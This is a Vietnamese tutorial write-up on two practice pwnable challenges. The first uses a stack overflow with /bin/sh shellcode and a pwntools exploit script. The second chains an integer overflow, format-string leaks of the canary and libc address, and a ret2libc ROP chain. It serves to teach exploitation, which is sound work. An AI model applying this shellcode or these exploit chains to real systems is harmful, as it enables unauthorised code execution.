# Introduction to Pwnable
## Challenge 1
### Description
Source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main() {
        char buffer[32];
        printf("DEBUG: %p\n", buffer);
        gets(buffer);
}
```

Để gọi được shell từ chương trình này, ta có thể truyền shellcode vào `buffer`, sau đó ghi đè `return address` của hàm main bằng địa chỉ bắt đầu của buffer. Lúc này, ghi hàm `main` kết thúc, tiến trình sẽ nhảy đến `buffer` và thực thi shellcode.  

### Exploit
#### Tính offset
Đầu tiên, ta debug chương trình và tìm địa chỉ của `buffer` và `return address` để tính offset.  

Đặt break points tại ngay sau khi hàm `gets` thực thi xong để tìm địa chỉ của `buffer` và ngay tại câu lệnh `ret` của hàm `main` để tìm địa chỉ của `return address`.  

![image](https://user-images.githubusercontent.com/44528004/145716119-399b31f3-0615-4c81-983e-505d6b117893.png)

Chạy chương trình với input là `AAAA`.  

![image](https://user-images.githubusercontent.com/44528004/145716136-6c4beecd-8d25-48cc-8f8d-b765461254f9.png)

Khi chương trình dừng lại tại break point đầu tiên, ta có thể thấy thanh ghi `$rax` lưu kết quả trả về của hàm `gets` và đang lưu địa chỉ của `buffer` `0x00007fffffffdec0`. Do `buffer` là biến cục bộ nên nó sẽ được lưu trên stack, vì vậy địa chỉ này chính là 1 ô nhớ trên stack.  

![image](https://user-images.githubusercontent.com/44528004/145716156-25b6145e-0a5c-4768-a1e8-d92506d7d15a.png)

Tại break point thứ 2, đỉnh của stack đang lưu giá trị của `return address` và đỉnh của stack lúc này đang là `0x00007fffffffdee8`.  

![image](https://user-images.githubusercontent.com/44528004/145716241-273b54e2-98ee-47d1-b146-4ca65633e731.png)

Từ các thông tin trên, ta tính được offset là `0x00007fffffffdee8 - 0x00007fffffffdec0 = 40` bytes. Vậy ta cần truyền vào buffer 40 bytes và thêm 8 bytes để ghi đè `return address`. Ở đây, shellcode sẽ được ghi vào 40 bytes này và `return address` sẽ được ghi đè bằng địa chỉ của `buffer`.

#### Lấy shellcode
Ở các bài trước, ta có assembly code sau để gọi `/bin/sh`:
```asm
section .text
global _start
_start:
        xor rax,rax
        push rax
        mov rbx,'/bin//sh'
        xor rsi,rsi
        xor rdx,rdx
        push rbx
        push rsp
        pop rdi
        mov al,0x3b
        syscall
```

Compile đoạn code assembly.
```bash
nasm -f elf64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode
```

Dùng `objdump` để xem shellcode của file object vừa compile:
```bash
└─$ objdump -d shellcode.o      

shellcode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:   48 31 c0                xor    %rax,%rax
   3:   50                      push   %rax
   4:   48 bb 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rbx
   b:   2f 73 68 
   e:   48 31 f6                xor    %rsi,%rsi
  11:   48 31 d2                xor    %rdx,%rdx
  14:   53                      push   %rbx
  15:   54                      push   %rsp
  16:   5f                      pop    %rdi
  17:   b0 3b                   mov    $0x3b,%al
  19:   0f 05                   syscall
```

Với đoạn code assembly này, ta có shellcode là:
```
\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05
```

Tuy nhiên, khi sử dụng shellcode này thì mình exploit không thành công nên mình thử bỏ câu lệnh `xor %rax,%rax` thì ta có shellcode là:
```
\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05
```

Lúc này thì mình exploit thành công. Script exploit:
```python
from pwn import *

p = process('./demo')

shellcode = b'\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05'
p.recvuntil('DEBUG: ')
buffer_addr = int(p.recv().strip()[2:], 16)

payload = shellcode + b'A' * (40 - len(shellcode)) + p64(buffer_addr)

with open('payload.in', 'wb') as f:
    f.write(payload)

p.sendline(payload)
p.interactive()
```

## Challenge 2
### Description
Source code:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win() {
        char name[0x40];
        char shell[16] = "/bin/sh\x00";
        if (strncmp(name, "Nghi Hoang Khoa dep trai", 24) == 0) {
                puts("Chuc mung ban da khong bi diem liet");
                system(shell);
        }
}

void vuln() {
        int len = 0, f = 0;
        char message[0x50];
        printf("Nhap do dai tin nhan: ");
        scanf("%d", &len);
        if (len < 0x50) {
                read(0, message, len);
                printf(message);
                puts("Ban co muon sua lai tin nhan khong?");
                puts("1. Co");
                puts("2. Khong");
                scanf("%d", &f);
                if (f == 1) {
                        read(0, message, len);
                }
        }
}

int main() {
        setbuf(stdin, 0);
        setbuf(stdout, 0);
        vuln();
        return 0;
}
```

### Observation
Từ source code, ta thấy rằng, chương trình sẽ yêu cầu ta nhập độ dài của tin nhắn và lưu vào `len`. Nếu `len < 0x50`, ta sẽ nhập message và sau đó ta có thêm 1 lần sửa lại message.  

Tuy nhiên, ở lần đọc `message` đầu tiên, `message` sẽ được in ra màn hình bằng hàm `printf`. Do đó, ta có thể khai thác hàm `printf` này để leak địa chỉ và giá trị trên stack.  

Bên cạnh đó, thông qua `checksec`, ta thấy được là chương trình này được bật đầy đủ chế độ bảo vệ.  
```
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
```

### Exploit
#### Integer overflow
Mở ghidra để xem pseudocode của hàm `vuln`.  

![image](https://user-images.githubusercontent.com/44528004/145931692-b94b7ab9-db0a-46d3-b79f-1e626942c81b.png)  

Ở đây, ta thấy rằng, `len` là được khai báo là `uint`, nhưng `len` được so sánh với `0x50` thì `len` được convert sang `int`. Sau đó, nếu `int(len) < 0x50`, ta sẽ được ghi giá trị vào message nhưng với `len` lúc này là `ulong`. Điều này cho thấy, nếu ta truyền `len` là một số `>= 0x80000000` thì `int(len)` sẽ luôn nhỏ hơn `0x50` vì từ 1 số không dấu `0x80000000` được convert sang 1 số có dấu thì sẽ trở thành số âm. Và số âm thì luôn `< 0x50` nên sẽ luôn thoả điều kiện. Bên cạnh đó, khi hàm `read` được thực thi, `len` lại được dùng như là 1 số không dấu nên lúc này độ dài message mà ta có thể ghi là rất lớn.

Vậy, với `len` ban đầu được khai báo là `uint`, `len` sẽ có độ dài là 4 bytes. Khi mình nhập `len = 0xffffffff`, thì chương trình chạy không ổn định vì có lúc mình bypass thành công, có lúc thì không.  

![image](https://user-images.githubusercontent.com/44528004/145933110-7e7da548-3d73-4a6c-aa50-c3f29e12205d.png)


Mình thử thay `len = 0x80000001`, thì chương trình trở nên ổn định hơn. Với `len = 0x80000001`, độ dài message mà ta có thể ghi được là `0x7fffffff` (xấp xỉ 2 GBs).  

![image](https://user-images.githubusercontent.com/44528004/145933150-cf7b6f85-89e4-49bf-b48a-a38e25ed0ebe.png)

Vậy `len` của ta sẽ sử dụng là `0x80000001`.

#### Format string
Ta sẽ khai thác lỗ hổng format string để leak địa chỉ của `message`.  

Từ hình bên dưới, ta thấy được rằng `message` sẽ là đối số thứ 8 trong format string.

![image](https://user-images.githubusercontent.com/44528004/146035768-82b3e00f-c110-4cec-97ee-55de68cea0eb.png)


#### Leak canary
Vì chương trình này được bảo vệ bởi canary để chống buffer overflow, ta sẽ cần leak giá trị của canary. Mục đích của việc leak giá trị của canary là để ta lưu giá trị vào 1 vị trí nào đó trong `message`, khi `message` bị overflow, vị trí của canary trong `message` sẽ tương ứng với vị trí của canary trên stack. Và do đó, sau khi overflow, canary trên stack vẫn không bị thay đổi.  

Khi xem assembly code, ta thấy được rằng, `message` nằm tại `rbp - 0x60` và canary nằm tại `rbp - 0x8`.  

![image](https://user-images.githubusercontent.com/44528004/146034358-8003fa63-b4e1-49f7-95d6-4d28ac749564.png)
> Phía trên là đoạn code của `printf(message);`.  

![image](https://user-images.githubusercontent.com/44528004/146034511-373c3a6e-8850-4d18-b84c-f922ce14b66a.png)
> Phía trên là đoạn code kiểm tra canary.  

Từ đó, ta tính được là `message` cách canary `0x60 - 0x8 = 0x58 = 88 bytes`. Bên cạnh đó, ta biết được rằng `message` là đối số thứ 8 đối với format string, vậy canary sẽ là đối số thứ `8 + 88/8 = 8 + 11 = 19` so với format string.  

Vậy, `%19$lx` sẽ leak được địa chỉ của canary tại runtime.

#### Tìm địa chỉ trả về
Sau khi có được giá trị của canary tại runtime để đảm bảo bypass được stack smashing protection, ta cần tính địa của hàm mà ta muốn trả về. Ban đầu, mình nghĩ là sẽ return về hàm `win`, tuy nhiên để gọi được `system` trong hàm `win` thì chuỗi `name` phải bằng `Nghi Hoang Khoa dep trai`. Mà `name` nằm trên stack và stack sẽ thường xuyên thay đôi khi chương trình đang chạy nên việc tìm được địa chỉ của `name` khá khó khăn. Vì vậy, mình thử hướng khác là **ret2libc**.

#### `ret2libc`
Đầu tiên, khi đặt break point ngay tại câu lệnh `ret` của hàm `vuln`, ta thấy được rằng câu lệnh tại `__libc_start_main+234` nằm ở `rsp + 0x10`, tương đương `rbp + 0x18` (`rbp` của hàm `vuln`. Mà canary nằm tại `rbp - 0x8` là đối số thứ 19 của foramt string, nên `__libc_start_main+234` nằm tại `rbp + 0x18` sẽ là đối số thứ 23 của format string. Vậy `%19$lx.%23$lx` sẽ giúp ta leak được canary và địa chỉ của câu lệnh tại `__libc_start_main+234`.  

![image](https://user-images.githubusercontent.com/44528004/146052827-f2f54fe4-4940-4355-827e-b7289e665d48.png)


Nếu ta lấy địa chỉ của `__libc_start_main+234` trừ cho `234` ta sẽ có địa chỉ nền của `__libc_start_main`. Nếu ta biết được relative address của `__libc_start_main`, ta sẽ tính được địa chỉ nền của `libc`. Vậy để biết được relative address của `__libc_start_main`, ta có thể `gdb /usr/lib/x86_64-linux-gnu/libc-2.32.so` và disassembly `__libc_start_main` để xem relative address.
> Để biết được đường dẫn của thư viện `libc`, ta có thể dùng `vmmap` trong `gef`.  
> ![image](https://user-images.githubusercontent.com/44528004/146054408-3ea416b2-7f45-428a-a33a-6b901647daa9.png)


![image](https://user-images.githubusercontent.com/44528004/146054094-e359d53a-0385-4305-afec-ba92c632d9a4.png)

Một cách khác là ta dùng `pwntools`.
```python
from pwn import *

e_libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.32.so')
print(e_libc.symbols['__libc_start_main'])
```

Sau khi có được relative address của `__libc_start_main`, ta có thể lấy địa chỉ runtime của `__libc_start_main` và trừ cho relative address, ta sẽ có được địa chỉ nền runtime của `libc`.  

#### Gọi `system`
Với địa chỉ nền runtime của `libc`, ta có thể tính được runtime address của nhiều thứ thông qua cách tìm relative address và cộng với địa chỉ nền runtime của `libc`. Ở đây, ta sẽ tìm cách gọi `system`. Và để gọi được `system`, ta cần setup cho `rdi` trỏ tới `/bin/sh`. Vậy ta cần:  
- Địa chỉ runtime của `system`.
- Địa chỉ runtime của `/bin/sh`.
- ROP gadget `pop rdi; ret`.  

Để làm được các việc trên, ta có thể tìm relative address của `system` trên `libc`; tìm relative address của câu lệnh `pop rdi; ret` trên `libc`; và relative address của chuỗi `/bin/sh` trên `libc`. Sau khi tìm được các relative address trên, ta chỉ cần cộng địa chỉ nền runtime của `libc` vào từng relative address là ta có được địa chỉ runtime của chúng.  

Code exploit:
```python
e_libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.32.so')
libc_start_main_offset = e_libc.symbols['__libc_start_main']
libc_base_addr = main_return_addr - 234 - libc_start_main_offset 

bin_sh_addr_offset = list(e_libc.search(b'/bin/sh'))[0]
bin_sh_runtime_addr = libc_base_addr + bin_sh_addr_offset

rop = ROP(e_libc)
pop_rdi_offset = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rdi_runtime_addr = libc_base_addr + pop_rdi_offset

system_offset = e_libc.symbols['system']
system_runtime_addr = libc_base_addr + system_offset
```
